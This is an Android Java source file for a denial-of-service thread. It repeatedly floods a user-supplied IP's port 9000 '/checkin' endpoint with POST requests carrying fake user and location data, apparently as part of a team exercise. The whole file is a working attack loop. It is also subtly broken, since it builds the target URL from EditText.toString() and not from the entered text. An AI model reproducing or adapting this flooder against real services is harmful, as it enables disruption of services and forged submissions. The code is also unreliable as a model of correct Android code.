package com.willinger.shmulik.dos;

import android.widget.EditText;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedWriter;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

public class DosThread extends Thread
{
    private AtomicBoolean running = new AtomicBoolean(true);

    private final URL url;
    private final String IpToAttack;

    String param = null;

    public DosThread(EditText ipToAttack) throws Exception
    {
        url = new URL("http://" + ipToAttack.toString() + ":9000/checkin");
        param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        IpToAttack = ipToAttack.toString();
        //attack();
    }


    @Override
    public void run()
    {
        while (running.get())
        {
            for (int i = 0; i < 100; i++)
            {
                try
                {
                    attack();
                }
                catch (Exception e)
                {
                    e.printStackTrace();
                }
            }
        }
    }

    public void attack() throws Exception
    {

        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setReadTimeout(100000);
        conn.setConnectTimeout(150000);
        conn.setRequestMethod("POST");
        conn.setDoInput(true);
        conn.setDoOutput(true);

        List<NameValuePair> params = new ArrayList<NameValuePair>();
        params.add(new BasicNameValuePair("userId", "Team10"));
        params.add(new BasicNameValuePair("latitude", "1"));
        params.add(new BasicNameValuePair("longitude", "2"));

        OutputStream os = conn.getOutputStream();
        BufferedWriter writer = new BufferedWriter(
                new OutputStreamWriter(os, "UTF-8"));
        writer.write(getQuery(params));
        writer.flush();
        writer.close();
        os.close();

        conn.connect();
    }

    private String getQuery(List<NameValuePair> params) throws UnsupportedEncodingException
    {
        StringBuilder result = new StringBuilder();
        boolean first = true;

        for (NameValuePair pair : params)
        {
            if (first)
                first = false;
            else
                result.append("&");

            result.append(URLEncoder.encode(pair.getName(), "UTF-8"));
            result.append("=");
            result.append(URLEncoder.encode(pair.getValue(), "UTF-8"));
        }

        return result.toString();
    }
}